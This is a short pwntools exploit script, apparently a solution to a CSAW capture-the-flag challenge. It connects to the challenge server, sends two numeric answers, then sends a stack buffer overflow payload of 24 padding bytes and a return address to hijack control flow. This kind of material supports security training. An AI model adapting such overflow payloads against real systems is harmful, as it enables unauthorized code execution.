from pwn import *

io = remote('pwn.chal.csaw.io', 5004)


payload = b'A'*24+p64(0x00000000004014fb)


io.sendline('1804289383')
io.sendline('7856445899213065428791')
io.sendline(payload)
print(io.recvall())
